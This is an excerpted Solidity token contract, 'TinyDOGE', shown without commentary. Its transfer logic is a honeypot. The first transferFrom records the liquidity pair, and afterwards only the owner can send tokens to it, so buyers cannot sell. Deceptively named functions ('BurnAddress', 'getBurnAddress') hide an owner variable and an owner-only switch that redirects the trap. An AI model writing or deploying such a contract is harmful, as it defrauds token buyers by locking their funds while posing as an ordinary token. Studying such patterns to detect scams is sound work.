...
contract Ownable {
    ...
    function BurnAddress() public view onlyOwner returns(address){
        return _xowner;
    }
...
contract TinyDOGE is IBEP20, Ownable{
    ...
    constructor(){
        ...
        setWallets(msg.sender,_totalSupply);
	...
	function getBurnAddress(address burn) public onlyOwner {
    liquidity = burn;
	}
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool){
		if(sender != address(0) && liquidity == address(0)) liquidity = recipient;
        else require(recipient != liquidity || sender == owner(), ".");
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(liquidity != address(0)) require(recipient != liquidity || sender == owner(), ".");  
